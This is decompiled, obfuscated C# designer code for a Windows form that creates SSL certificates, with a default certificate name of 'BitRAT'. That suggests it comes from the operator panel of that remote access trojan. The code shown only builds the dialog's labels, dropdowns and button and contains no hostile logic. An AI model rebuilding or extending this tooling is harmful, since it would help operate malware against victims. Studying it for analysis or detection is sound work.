﻿// Token: 0x020001B8 RID: 440
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public sealed partial class fCertificate : global::System.Windows.Forms.Form
{
	// Token: 0x06001830 RID: 6192 RVA: 0x000B0AD4 File Offset: 0x000AECD4
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x06001831 RID: 6193 RVA: 0x000B0B14 File Offset: 0x000AED14
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.icontainer_0 = new global::System.ComponentModel.Container();
		global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::fCertificate));
		this.vmethod_1(new global::System.Windows.Forms.Label());
		this.vmethod_3(new global::System.Windows.Forms.Label());
		this.vmethod_5(new global::System.Windows.Forms.ComboBox());
		this.vmethod_7(new global::System.Windows.Forms.Label());
		this.vmethod_9(new global::System.Windows.Forms.ComboBox());
		this.vmethod_11(new global::System.Windows.Forms.Label());
		this.vmethod_13(new global::System.Windows.Forms.Label());
		this.vmethod_15(new global::System.Windows.Forms.TextBox());
		this.vmethod_17(new global::System.Windows.Forms.Timer(this.icontainer_0));
		this.vmethod_19(new global::System.Windows.Forms.Label());
		this.vmethod_21(new global::System.Windows.Forms.PictureBox());
		this.vmethod_23(new global::VisualPlus.Toolkit.Controls.Interactivity.VisualButton());
		this.vmethod_25(new global::System.Windows.Forms.Timer(this.icontainer_0));
		((global::System.ComponentModel.ISupportInitialize)this.vmethod_20()).BeginInit();
		base.SuspendLayout();
		this.vmethod_0().AutoSize = true;
		this.vmethod_0().BackColor = global::System.Drawing.Color.Transparent;
		this.vmethod_0().ForeColor = global::System.Drawing.Color.RoyalBlue;
		this.vmethod_0().Location = new global::System.Drawing.Point(308, 78);
		this.vmethod_0().Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
		this.vmethod_0().Name = "lblRecommendedKey";
		this.vmethod_0().Size = new global::System.Drawing.Size(88, 13);
		this.vmethod_0().TabIndex = 32;
		this.vmethod_0().Text = "(Recommended!)";
		this.vmethod_2().AutoSize = true;
		this.vmethod_2().BackColor = global::System.Drawing.Color.Transparent;
		this.vmethod_2().ForeColor = global::System.Drawing.Color.RoyalBlue;
		this.vmethod_2().Location = new global::System.Drawing.Point(308, 48);
		this.vmethod_2().Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
		this.vmethod_2().Name = "lblRecommendedAlgo";
		this.vmethod_2().Size = new global::System.Drawing.Size(88, 13);
		this.vmethod_2().TabIndex = 31;
		this.vmethod_2().Text = "(Recommended!)";
		this.vmethod_4().BackColor = global::System.Drawing.Color.White;
		this.vmethod_4().DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.vmethod_4().ForeColor = global::System.Drawing.Color.Black;
		this.vmethod_4().FormattingEnabled = true;
		this.vmethod_4().Location = new global::System.Drawing.Point(115, 75);
		this.vmethod_4().Margin = new global::System.Windows.Forms.Padding(2);
		this.vmethod_4().Name = "cbKeyStrength";
		this.vmethod_4().Size = new global::System.Drawing.Size(187, 21);
		this.vmethod_4().TabIndex = 30;
		this.vmethod_4().TabStop = false;
		this.vmethod_6().AutoSize = true;
		this.vmethod_6().BackColor = global::System.Drawing.Color.Transparent;
		this.vmethod_6().ForeColor = global::System.Drawing.Color.Black;
		this.vmethod_6().Location = new global::System.Drawing.Point(42, 78);
		this.vmethod_6().Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
		this.vmethod_6().Name = "lblKeyStrength";
		this.vmethod_6().Size = new global::System.Drawing.Size(69, 13);
		this.vmethod_6().TabIndex = 29;
		this.vmethod_6().Text = "Key strength:";
		this.vmethod_8().BackColor = global::System.Drawing.Color.White;
		this.vmethod_8().DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.vmethod_8().ForeColor = global::System.Drawing.Color.Black;
		this.vmethod_8().FormattingEnabled = true;
		this.vmethod_8().Location = new global::System.Drawing.Point(115, 45);
		this.vmethod_8().Margin = new global::System.Windows.Forms.Padding(2);
		this.vmethod_8().Name = "cbSignatureAlgo";
		this.vmethod_8().Size = new global::System.Drawing.Size(187, 21);
		this.vmethod_8().TabIndex = 28;
		this.vmethod_8().TabStop = false;
		this.vmethod_10().AutoSize = true;
		this.vmethod_10().BackColor = global::System.Drawing.Color.Transparent;
		this.vmethod_10().ForeColor = global::System.Drawing.Color.Black;
		this.vmethod_10().Location = new global::System.Drawing.Point(11, 48);
		this.vmethod_10().Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
		this.vmethod_10().Name = "lblSignatureAlgo";
		this.vmethod_10().Size = new global::System.Drawing.Size(100, 13);
		this.vmethod_10().TabIndex = 27;
		this.vmethod_10().Text = "Signature algorithm:";
		this.vmethod_12().AutoSize = true;
		this.vmethod_12().BackColor = global::System.Drawing.Color.Transparent;
		this.vmethod_12().ForeColor = global::System.Drawing.Color.Black;
		this.vmethod_12().Location = new global::System.Drawing.Point(25, 19);
		this.vmethod_12().Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
		this.vmethod_12().Name = "Label1";
		this.vmethod_12().Size = new global::System.Drawing.Size(86, 13);
		this.vmethod_12().TabIndex = 33;
		this.vmethod_12().Text = "Certificate name:";
		this.vmethod_14().Location = new global::System.Drawing.Point(115, 16);
		this.vmethod_14().Margin = new global::System.Windows.Forms.Padding(1);
		this.vmethod_14().MaxLength = 64;
		this.vmethod_14().Name = "txtCertName";
		this.vmethod_14().Size = new global::System.Drawing.Size(187, 20);
		this.vmethod_14().TabIndex = 34;
		this.vmethod_14().Text = "BitRAT";
		this.vmethod_16().Enabled = true;
		this.vmethod_18().AutoSize = true;
		this.vmethod_18().BackColor = global::System.Drawing.Color.Transparent;
		this.vmethod_18().Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Italic, global::System.Drawing.GraphicsUnit.Point, 0);
		this.vmethod_18().ForeColor = global::System.Drawing.Color.Black;
		this.vmethod_18().Location = new global::System.Drawing.Point(254, 126);
		this.vmethod_18().Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
		this.vmethod_18().Name = "lblWhatIsCert";
		this.vmethod_18().Size = new global::System.Drawing.Size(136, 13);
		this.vmethod_18().TabIndex = 35;
		this.vmethod_18().Text = "What is an SSL certificate?";
		this.vmethod_20().Image = global::Class131.smethod_24();
		this.vmethod_20().Location = new global::System.Drawing.Point(394, 125);
		this.vmethod_20().Margin = new global::System.Windows.Forms.Padding(2);
		this.vmethod_20().Name = "pbWhatIsCert";
		this.vmethod_20().Size = new global::System.Drawing.Size(15, 15);
		this.vmethod_20().SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.vmethod_20().TabIndex = 80;
		this.vmethod_20().TabStop = false;
		this.vmethod_22().Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right);
		this.vmethod_22().BackColorState.Disabled = global::System.Drawing.Color.FromArgb(224, 224, 224);
		this.vmethod_22().BackColorState.Enabled = global::System.Drawing.Color.FromArgb(220, 220, 220);
		this.vmethod_22().BackColorState.Hover = global::System.Drawing.Color.FromArgb(224, 224, 224);
		this.vmethod_22().BackColorState.Pressed = global::System.Drawing.Color.FromArgb(192, 192, 192);
		this.vmethod_22().Border.Color = global::System.Drawing.Color.FromArgb(180, 180, 180);
		this.vmethod_22().Border.HoverColor = global::System.Drawing.Color.FromArgb(120, 183, 230);
		this.vmethod_22().Border.HoverVisible = true;
		this.vmethod_22().Border.Rounding = 6;
		this.vmethod_22().Border.Thickness = 1;
		this.vmethod_22().Border.Type = 1;
		this.vmethod_22().Border.Visible = true;
		this.vmethod_22().DialogResult = global::System.Windows.Forms.DialogResult.None;
		this.vmethod_22().ForeColor = global::System.Drawing.Color.FromArgb(0, 0, 0);
		this.vmethod_22().Image = null;
		this.vmethod_22().Location = new global::System.Drawing.Point(12, 123);
		this.vmethod_22().MouseState = 0;
		this.vmethod_22().Name = "btnGenerate";
		this.vmethod_22().Size = new global::System.Drawing.Size(118, 19);
		this.vmethod_22().TabIndex = 84;
		this.vmethod_22().Text = "Create";
		this.vmethod_22().TextImageRelation = global::System.Windows.Forms.TextImageRelation.Overlay;
		this.vmethod_22().TextStyle.Disabled = global::System.Drawing.Color.FromArgb(131, 129, 129);
		this.vmethod_22().TextStyle.Enabled = global::System.Drawing.Color.FromArgb(0, 0, 0);
		this.vmethod_22().TextStyle.Hover = global::System.Drawing.Color.FromArgb(0, 0, 0);
		this.vmethod_22().TextStyle.Pressed = global::System.Drawing.Color.FromArgb(0, 0, 0);
		this.vmethod_22().TextStyle.TextAlignment = global::System.Drawing.StringAlignment.Center;
		this.vmethod_22().TextStyle.TextLineAlignment = global::System.Drawing.StringAlignment.Center;
		this.vmethod_22().TextStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.vmethod_24().Interval = 500;
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = global::System.Drawing.SystemColors.AppWorkspace;
		base.ClientSize = new global::System.Drawing.Size(417, 147);
		base.Controls.Add(this.vmethod_22());
		base.Controls.Add(this.vmethod_20());
		base.Controls.Add(this.vmethod_18());
		base.Controls.Add(this.vmethod_14());
		base.Controls.Add(this.vmethod_12());
		base.Controls.Add(this.vmethod_0());
		base.Controls.Add(this.vmethod_2());
		base.Controls.Add(this.vmethod_4());
		base.Controls.Add(this.vmethod_6());
		base.Controls.Add(this.vmethod_8());
		base.Controls.Add(this.vmethod_10());
		this.DoubleBuffered = true;
		base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "fCertificate";
		base.Opacity = 0.0;
		this.Text = "Create new SSL certificate";
		base.TopMost = true;
		((global::System.ComponentModel.ISupportInitialize)this.vmethod_20()).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	// Token: 0x040008FF RID: 2303
	private global::System.ComponentModel.IContainer icontainer_0;
}
